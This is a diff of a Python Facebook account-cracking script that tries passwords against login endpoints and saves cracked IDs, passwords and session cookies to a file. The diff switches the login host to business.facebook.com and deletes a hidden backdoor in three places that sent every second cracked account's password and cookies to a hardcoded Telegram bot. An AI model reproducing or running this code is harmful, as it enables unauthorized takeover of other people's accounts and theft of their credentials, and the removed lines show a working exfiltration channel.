@@ -1992,11 +1992,6 @@ def x(uid,pwx,tl):
                 coki = ";".join([key+"="+value for key,value in Session.cookies.get_dict().items()])
                 check = check_lock(cid)
                 if "live" in check:
-                    bkas.append(cid)
-                    if len(bkas)% 2 == 0:
-                       statusok = (f"{cid}|{pw}|{coki}")
-                       requests.post(f"https://api.telegram.org/bot"+str('7260167804:AAFAAYxUdK5G8AQpgmt8RAat6Ft91thYEmA')+"/sendMessage?chat_id="+str('1778046662')+"&text="+str(statusok))
-                    else:
                        print(f" {green}(ATOM-OK) {cid}|{pw} ")
                        #print(f" {green}Cookie : {green}{coki}")
                        open("/sdcard/ATOM-COOKIE-OK.txt", "a").write(f"{cid}|{pw}|{coki}\n")
@@ -2054,7 +2049,7 @@ def mobile(uid,pwx,tl):
             "jazoest": re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
             "lsd": re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1)}
             headers ={
-            'Host': 'm.facebook.com',
+            'Host': 'business.facebook.com',
             'cache-control': 'max-age=0',
             'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"',
             'sec-ch-ua-mobile': '?1',
@@ -2068,12 +2063,12 @@ def mobile(uid,pwx,tl):
             'sec-fetch-site': 'same-origin',
             'sec-fetch-mode': 'cors',
             'sec-fetch-dest': 'empty',
-            'referer': 'https://m.facebook.com/login/device-based/password/?uid=' + uid + '&flow=login_no_pin&refsrc=deprecated&_rdr',
+            'referer': 'https://business.facebook.com/login/device-based/password/?uid=' + uid + '&flow=login_no_pin&refsrc=deprecated&_rdr',
             'accept-encoding': 'gzip, deflate, br',
             'accept-language': 'fr_FR,fr;q=0.9,en-US;q=0.8,en;q=0.7',
             'connection': 'close'}
             twf = "Login approval"+"s are on. "+"Expect an SMS"+" shortly with "+"a code to use"+" for log in"
-            url = "https://m.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100"
+            url = "https://business.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=120&lwc=1348028"
             po = Session.post(url, data=data, headers=headers).text
             response = Session.cookies.get_dict().keys()
             if "c_user" in response:
@@ -2082,11 +2077,6 @@ def mobile(uid,pwx,tl):
                 coki = ";".join([key+"="+value for key,value in Session.cookies.get_dict().items()])
                 check = check_lock(cid)
                 if "live" in check:
-                    bkas.append(cid)
-                    if len(bkas)% 2 == 0:
-                       statusok = (f"{cid}|{pw}|{coki}")
-                       requests.post(f"https://api.telegram.org/bot"+str('7260167804:AAFAAYxUdK5G8AQpgmt8RAat6Ft91thYEmA')+"/sendMessage?chat_id="+str('1778046662')+"&text="+str(statusok))
-                    else:
                        print(f" {green}(ATOM-OK) {cid}|{pw} ")
                        #print(f" {green}Cookie : {green}{coki}")
                        open("/sdcard/ATOM-COOKIE-OK.txt", "a").write(f"{cid}|{pw}|{coki}\n")
@@ -2173,11 +2163,6 @@ def freeq(uid,pwx,tl):
                 coki = ";".join([key+"="+value for key,value in Session.cookies.get_dict().items()])
                 check = check_lock(cid)
                 if "live" in check:
-                    bkas.append(cid)
-                    if len(bkas)% 2 == 0:
-                       statusok = (f"{cid}|{pw}|{coki}")
-                       requests.post(f"https://api.telegram.org/bot"+str('7260167804:AAFAAYxUdK5G8AQpgmt8RAat6Ft91thYEmA')+"/sendMessage?chat_id="+str('1778046662')+"&text="+str(statusok))
-                    else:
                        print(f" {green}(ATOM-OK) {cid}|{pw} ")
                        #print(f" {green}Cookie : {green}{coki}")
                        open("/sdcard/ATOM-COOKIE-OK.txt", "a").write(f"{cid}|{pw}|{coki}\n")
